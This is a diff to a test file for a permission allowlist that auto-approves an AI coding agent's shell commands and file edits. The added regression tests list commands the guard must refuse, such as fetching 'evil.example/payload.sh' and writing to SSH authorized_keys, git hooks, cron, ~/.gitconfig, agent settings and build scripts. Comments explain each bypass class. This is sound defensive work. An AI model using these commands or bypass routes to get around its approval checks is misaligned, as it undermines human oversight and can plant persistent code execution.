@@ -382,7 +382,6 @@ describe('net-read: covered', () => {
   const cases: Array<[string, string]> = [
     ['curl https://api.github.com/repos/o/r', 'net-read:curl'],
     ['curl -sSL https://example.com/data.json', 'net-read:curl'],
-    ['wget https://example.com/page.html', 'net-read:wget'],
     ['gh api /repos/yooz-labs/remi/pulls', 'net-read:gh api'],
   ];
   for (const [cmd, expected] of cases) {
@@ -447,5 +446,159 @@ describe('#959: write groups are opt-in and do not leak into read groups', () =>
     expect(bash('git status && mkdir -p build', [...ALL, ...WRITE_GROUPS])).not.toBeNull();
     // ...but an uncovered segment still sinks the whole command.
     expect(bash('git status && rm -rf build', [...ALL, ...WRITE_GROUPS])).toBeNull();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// #960 review: six Critical bypasses, all reproduced against the first cut of
+// these groups. None had a negative test, because none of the bug CLASSES had
+// been conceived of -- so each gets one here, named for its class rather than
+// its instance.
+// ---------------------------------------------------------------------------
+
+describe('#960 regression: getopt bundling and attached values', () => {
+  // The first cut expressed every flag veto as `/(^|\s)-X(\s|=|$)/`, which
+  // requires the flag to be its own token. getopt allows neither assumption:
+  // `-abc` === `-a -b -c`, and `-XPOST` attaches the value with no separator.
+  const mustBeNull = [
+    'curl -XPOST https://api.example.com/records', // attached value
+    'curl -sSfLo out.txt https://evil.example/p', // -o bundled behind -sSfL
+    'curl -ofile.txt https://evil.example/p', // -o with attached value
+    'curl -d@payload.json https://api.example.com/x', // -d attached
+    'curl -D headers.txt https://x', // writes a local file; absent entirely before
+    'curl -c cookies.txt https://x', // ditto
+    'curl --trace trace.txt https://x',
+    'curl -K /tmp/evil.conf https://x',
+    'cp -rf src existingfile.txt', // -f bundled behind -r
+    'mv -vf a b',
+    'git checkout -qf develop', // -f bundled: discards uncommitted work
+    'git commit -qn -m x', // -n === --no-verify, bundled
+  ];
+  for (const cmd of mustBeNull) {
+    test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+  }
+
+  test('safe short flags still bundle fine', () => {
+    // The allowlist must not refuse ordinary usage, or the group stops being
+    // worth enabling.
+    expect(bash('curl -sSL https://example.com/data.json', WRITE_GROUPS)).toBe('net-read:curl');
+    expect(bash('cp -rp src dest', WRITE_GROUPS)).toBe('fs-write:cp');
+    expect(bash('git commit -am "fix: thing"', WRITE_GROUPS)).toBe('vcs-write:git commit');
+  });
+
+  test('an unknown short flag fails CLOSED', () => {
+    // The allowlist direction: a flag nobody classified must escalate rather
+    // than be assumed safe.
+    expect(bash('curl -Z https://x', WRITE_GROUPS)).toBeNull();
+    expect(bash('cp -Q a b', WRITE_GROUPS)).toBeNull();
+  });
+});
+
+describe('#960 regression: long-option abbreviation', () => {
+  // git resolves unambiguous abbreviations, so an exact-spelling veto is
+  // bypassed by dropping a letter.
+  for (const cmd of ['git commit --no-verif -m x', 'git checkout --forc develop']) {
+    test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+  }
+
+  test('and extensions of a dangerous flag are caught too', () => {
+    expect(bash('git push --force-with-lease origin x', WRITE_GROUPS)).toBeNull();
+  });
+});
+
+describe('#960 regression: wget writes by default', () => {
+  test('wget is in no group at all', () => {
+    // Unlike curl, bare `wget <url>` writes the body to a file in the cwd.
+    // There is no read-only default form to curate.
+    expect(bash('wget https://evil.example/payload.sh', WRITE_GROUPS)).toBeNull();
+    expect(bash('wget https://example.com/page.html', WRITE_GROUPS)).toBeNull();
+  });
+});
+
+describe('#960 regression: case-insensitive filesystem', () => {
+  // macOS resolves these to the same inodes as their lowercase spellings, so
+  // a case-sensitive guard is a total bypass, not a cosmetic gap.
+  const mustBeNull = [
+    'cp evil /ETC/hosts',
+    'cp evil ~/.REMI/config.toml',
+    'touch ~/.Claude/settings.json',
+    'cp payload .GIT/hooks/pre-commit',
+    'cp x /Users/y/.SSH/authorized_keys',
+  ];
+  for (const cmd of mustBeNull) {
+    test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+  }
+
+  test('and via the tool path', () => {
+    expect(matchGroups('Write', { file_path: '~/.REMI/config.toml' }, WRITE_GROUPS)).toBeNull();
+    expect(matchGroups('Edit', { file_path: '/ETC/hosts' }, WRITE_GROUPS)).toBeNull();
+  });
+});
+
+describe('#960 regression: .. traversal into a system tree', () => {
+  const mustBeNull = [
+    'cp evil /Users/yahya/project/../../../etc/hosts',
+    'cp evil ../../../etc/cron.d/backdoor',
+    'touch ../../../../usr/local/bin/remi',
+  ];
+  for (const cmd of mustBeNull) {
+    test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+  }
+
+  test('an ordinary ascending path is NOT refused', () => {
+    // The over-block boundary: refusing every `..` would escalate normal work.
+    expect(bash('git worktree add ../sibling -b feature/x', WRITE_GROUPS)).toBe(
+      'vcs-write:git worktree add',
+    );
+    expect(bash('cp a ../sibling/b', WRITE_GROUPS)).toBe('fs-write:cp');
+  });
+});
+
+describe('#960 regression: ~/.gitconfig is code execution', () => {
+  test('refused on both paths', () => {
+    // core.hooksPath / `!`-aliases reach `.git/hooks`-equivalent execution
+    // without ever naming `.git/`.
+    expect(bash('cp evil ~/.gitconfig', WRITE_GROUPS)).toBeNull();
+    expect(matchGroups('Edit', { file_path: '~/.gitconfig' }, WRITE_GROUPS)).toBeNull();
+  });
+});
+
+describe('#960 regression: build surface + the DEFAULT-ON build-test group', () => {
+  // The worst of the six: it needs no second opt-in. `bun run typecheck` is a
+  // `build-test` prefix and `build-test` ships enabled, so an auto-approved
+  // write to `package.json` scripts plus an auto-approved build command is
+  // code execution from two individually-approved steps.
+  const mustBeNull = [
+    'cp payload package.json',
+    'tee .github/workflows/ci.yml',
+    'cp x tsconfig.json',
+    'cp x biome.json',
+    'cp x Makefile',
+    'cp x pyproject.toml',
+    'cp x bunfig.toml',
+    'mv evil bun.lock',
+  ];
+  for (const cmd of mustBeNull) {
+    test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+  }
+
+  test('the mutating tools are guarded too', () => {
+    for (const file_path of [
+      '/Users/x/p/package.json',
+      '/Users/x/p/tsconfig.json',
+      '/Users/x/p/.github/workflows/ci.yml',
+      '/Users/x/p/Makefile',
+    ]) {
+      expect(matchGroups('Write', { file_path }, WRITE_GROUPS)).toBeNull();
+      expect(matchGroups('Edit', { file_path }, WRITE_GROUPS)).toBeNull();
+    }
+  });
+
+  test('ordinary source files are still covered', () => {
+    // The whole point of the group survives.
+    expect(matchGroups('Write', { file_path: '/Users/x/p/src/thing.ts' }, WRITE_GROUPS)).toBe(
+      'fs-write:Write',
+    );
+    expect(bash('cp src/a.ts src/b.ts', WRITE_GROUPS)).toBe('fs-write:cp');
   });
 });
